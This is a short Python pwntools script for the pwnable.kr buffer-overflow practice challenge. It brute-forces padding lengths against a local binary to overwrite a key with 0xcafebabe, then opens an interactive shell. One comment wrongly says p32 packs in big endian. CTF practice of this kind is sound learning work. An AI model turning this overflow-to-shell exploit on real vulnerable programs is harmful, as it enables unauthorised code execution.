# https://medium.com/@codingkarma/buffer-overflow-using-pwntools-pwnable-kr-1ac19dcb7240
from pwn import *

### Exploit Variable #######################################
for length in range(32, 50):
    io = process("/tmp/test")
    variable = p32(0xcafebabe) # Auto converts using big endian
    io.send(b"A"*length+variable+b"\n")
    res = io.recv(4096, timeout=2)

    print("Output:")
    print(res.decode())

    if res == b'overflow me : Value of Key: cafebabe\n':
        io.send("whoami\n")
        io.interactive()
        exit()
    else:
        #print(res)
        io.close()

    print("#"*80)
